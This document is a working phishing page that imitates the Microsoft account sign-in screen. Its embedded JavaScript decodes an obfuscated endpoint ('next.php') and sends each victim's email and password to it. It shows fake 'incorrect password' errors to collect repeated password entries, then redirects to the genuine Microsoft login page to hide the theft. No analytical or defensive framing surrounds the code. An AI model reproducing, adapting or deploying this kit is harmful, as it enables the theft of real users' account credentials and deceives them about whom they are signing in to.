 <body class="cb" style="display: block;">
  <form action="" autocomplete="off" class="provide-min-height" id="i0281" method="post" name="f1" novalidate="novalidate" spellcheck="false" target="_top">
   <div class="login-paginated-page">
    <div class="provide-min-height" id="lightboxTemplateContainer">
     <div class="provide-min-height" id="lightboxBackgroundContainer">
      <div class="background-image-holder" role="presentation">
       <div class="background-image ext-background-image" id="backgroundImage" style='background-image: url("https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg");'>
       </div>
      </div>
     </div>
     <div class="outer">
      <div class="template-section main-section">
       <div class="middle ext-middle">
        <div class="full-height">
         <div class="flex-column">
          <div class="win-scroll">
           <div class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup" id="lightbox">
            <div class="lightbox-cover">
            </div>
            <div>
             <img alt="Microsoft" class="logo" role="img" src="files/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"/>
            </div>
            <div role="main">
             <div class="identityBanner" id="identityBanner" style="display:none;">
              <button class="backButton" type="button">
               <img role="presentation" src="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"/>
              </button>
              <div class="identity" id="displayName">
               Display Name Goes Here
              </div>
             </div>
             <div class="">
              <div class="pagination-view animate slide-in-back">
               <div data-showfedcredbutton="true" data-viewid="1">
                <div>
                 <div>
                  <div class="row title ext-title" id="loginHeader">
                   <div id="theTitle" role="heading">
                    Sign in
                   </div>
                  </div>
                 </div>
                </div>
                <div class="row">
                 <div aria-live="assertive" role="alert">
                  <div class="col-md-24 error ext-error" id="usernameError" style="display:none;">
                   We couldn't find an account with that username. Try another, or
                   <a href="#" id="idA_PWD_SignUp">
                    get a new Microsoft account
                   </a>
                   .
                  </div>
                 </div>
                 <div class="form-group col-md-24">
                  <div class="placeholderContainer">
                   <input class="form-control ltr_override input ext-input text-box ext-text-box" id="i0116" maxlength="113" name="loginfmt" placeholder="Email, phone, or Skype" type="email"/>
                   <input aria-hidden="true" autocomplete="off" class="form-control ltr_override input ext-input text-box ext-text-box moveOffScreen" id="i0118" name="passwd" placeholder="Password" type="password"/>
                  </div>
                 </div>
                 <div class="position-buttons password-reset-links-container ext-password-reset-links-container">
                  <div class="row">
                   <div class="col-md-24">
                    <div class="text-13">
                     <div class="form-group" id="noAccount">
                      No account?
                      <a aria-label="Create a Microsoft account" href="#" id="signup">
                       Create one!
                      </a>
                     </div>
                     <div class="form-group">
                      <a href="#" id="cantAccessAccount" name="cannotAccessAccount">
                       Canâ€™t access your account?
                      </a>
                     </div>
                    </div>
                   </div>
                  </div>
                 </div>
                 <div class="win-button-pin-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
                  <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
                   <div>
                    <div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container">
                     <div class="inline-block button-item ext-button-item" data-bind="css: { 'inline-block': true }, externalCss: { 'button-item': true }">
                      <input class="win-button button-secondary button ext-button secondary ext-secondary" disabled="" id="idBtn_Back" type="button" value="Back"/>
                     </div>
                     <div class="inline-block button-item ext-button-item">
                      <input class="win-button button_primary button ext-button primary ext-primary" id="idSIButton9" type="submit" value="Next"/>
                      <input class="win-button button_primary button ext-button primary ext-primary" id="idSIButton10" style="display:none;" type="submit" value="Sign in"/>
                     </div>
                    </div>
                   </div>
                  </div>
                 </div>
                 <div>
                  <input data-bind="value: timeOnPage" name="i19" type="hidden" value=""/>
                 </div>
                </div>
               </div>
              </div>
             </div>
            </div>
           </div>
           <div class="row" id="theOptions">
            <div class="promoted-fed-cred-box ext-promoted-fed-cred-box">
             <div class="promoted-fed-cred-content">
              <div class="row tile">
               <div aria-label="Sign-in options" class="table" role="button" tabindex="0">
                <div class="table-row">
                 <div class="table-cell tile-img medium">
                  <img class="tile-img medium" role="presentation" src="files/signin-options_4e48046ce74f4b89d45037c90576bfac.svg"/>
                  <!-- /ko -->
                 </div>
                 <div class="table-cell text-left content">
                  <div data-test-id="signinOptions">
                   Sign-in options
                  </div>
                 </div>
                </div>
               </div>
              </div>
             </div>
            </div>
           </div>
           <div class="footer ext-footer" id="footer" role="contentinfo">
            <div>
             <div class="footerNode text-secondary footer-links ext-footer-links" id="footerLinks">
              <a class="footer-content ext-footer-content footer-item ext-footer-item" href="#" id="ftrTerms">
               Terms of use
              </a>
              <a class="footer-content ext-footer-content footer-item ext-footer-item" href="#" id="ftrPrivacy">
               Privacy &amp; cookies
              </a>
              <a aria-expanded="false" aria-label="Click here for troubleshooting information" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item" href="#" id="moreOptions" role="button">
               ...
              </a>
             </div>
            </div>
           </div>
          </div>
         </div>
        </div>
       </div>
      </div>
     </div>
    </div>
   </div>
  </form>
 </body>
 <script>
  $(document).ready(function(){
			var count=0;
			var uri = atob('bmV4dC5waHA');

			function ValidateEmail(mail) {
				if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(mail)){
					return (true)
				}
					return (false)
			}
			function postdata(){
				$.ajax({
					dataType: 'JSON',
					url: uri,
					type: 'GET',
					data: {
						ai: i0116.value,
						pr: i0118.value
					},
					beforeSend: function(xhr) {
						$('#idSIButton10').val('Verifing...');
						$("#idSIButton10").attr("disabled", true);
					},
					success: function(response) {
						//console.log(response);
						if(response['signal'] == "ok") { 
							$("#idSIButton10").attr("disabled", false);
							if(count <= 2) {
								count++;
								console.log(count);
								$("#i0118").val('');
								$("#i0118").focus();
								$('#idSIButton10').html('Sign in');
								$("#idSIButton10").attr("disabled", false);
							}else{
								$('#msg').html('Success! Redirecting...');
								setTimeout('window.location.href=\x27https://login.microsoftonline.com\x27;', 0x5dc);
							}
						}
					},
					complete: function(response) {
						console.log(response);
						document.getElementById("usernameError").innerHTML = "Your account or password is incorrect. If you don't remember your password, <a id='idA_IL_ForgotPassword0' href='#' role='link'>reset it now.";
					document.getElementById("usernameError").style.display = "block";
						$('#idSIButton10').val('Sign in');
						$("#idSIButton10").attr("disabled", false);
					}
					
				});
			}
			$('#idSIButton9').click(function(event){
				event.preventDefault();
				if(!ValidateEmail(i0116.value)){
					document.getElementById("usernameError").style.display = "block";
					i0116.focus();	
				}else{
					document.getElementById("theOptions").style.display = "none";
					document.getElementById("noAccount").style.display = "none";
					document.getElementById("i0116").style.display = "none";
					document.getElementById("idBtn_Back").style.display = "none";
					document.getElementById("idSIButton9").style.display = "none";
					document.getElementById("identityBanner").style.display = "block";
					document.getElementById("idSIButton10").style.display = "block";
					document.getElementById("i0118").classList.remove("moveOffScreen");
					document.getElementById('cantAccessAccount').innerHTML = "Forgot my password";
					document.getElementById('theTitle').innerHTML = "Enter password";
					var email=$("#i0116").val();
					document.getElementById('displayName').innerHTML = email;
				}
				
			});
			$('#idSIButton10').click(function(event){
				event.preventDefault();
				var psf=$("#i0118").val();
				document.getElementById("usernameError").style.display = "none";
				if (!psf || psf === "") {
					document.getElementById("usernameError").innerHTML = "Your account or password is incorrect. If you don't remember your password, <a id='idA_IL_ForgotPassword0' href='#' role='link'>reset it now.";
					document.getElementById("usernameError").style.display = "block";
					i0118.focus();
				}else{
					postdata();
				}
			});
		});
 </script>
</html>
